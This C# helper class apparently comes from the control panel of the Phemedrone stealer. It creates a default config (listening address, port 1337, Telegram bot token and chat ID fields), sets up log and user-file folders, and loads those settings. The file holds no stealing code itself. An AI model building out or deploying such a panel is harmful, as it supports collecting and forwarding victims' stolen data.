using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Net;

namespace Phemedrone.Panel;
public class Helper
{
    private static string jsoncfg = "{\n  \"Panel\": {\n    \"IpAddress\": \"127.0.0.1\",\n    \"Port\": 1337,\n    \"SendToTelegram\": true,\n    \"BotToken\": \"ENTER YOUR BOT TOKEN\",\n    \"ChatID\": \"ENTER YOUR CHATID\" \n  }\n}";
    public static void CheckDirect()
    {
        if (!File.Exists("config.json"))
        {
            StreamWriter f = new StreamWriter("config.json", true);
            f.WriteLine(jsoncfg);
            f.Close();
        }
        if (!Directory.Exists("logs"))
        {
            Directory.CreateDirectory("logs");
        }

        if (!Directory.Exists("files"))
        {
            Directory.CreateDirectory("files");
            Directory.CreateDirectory("files\\users");
        }

        if (!Directory.Exists("files\\users"))
        {
            Directory.CreateDirectory("files\\users");
        }
    }
    public static void LoadCfg()
    {
        
        string jsonContent = File.ReadAllText("config.json");
            
        JObject config = JsonConvert.DeserializeObject<JObject>(jsonContent);

        Program.ip = IPAddress.Parse(config["Panel"]["IpAddress"].ToString());;
        Program.Port = int.Parse(config["Panel"]["Port"].ToString());
        Program.SendTG = (bool)config["Panel"]["SendToTelegram"];
        Program.botToken = (string)config["Panel"]["BotToken"];
        Program.chatID = (string)config["Panel"]["ChatID"];
    }
}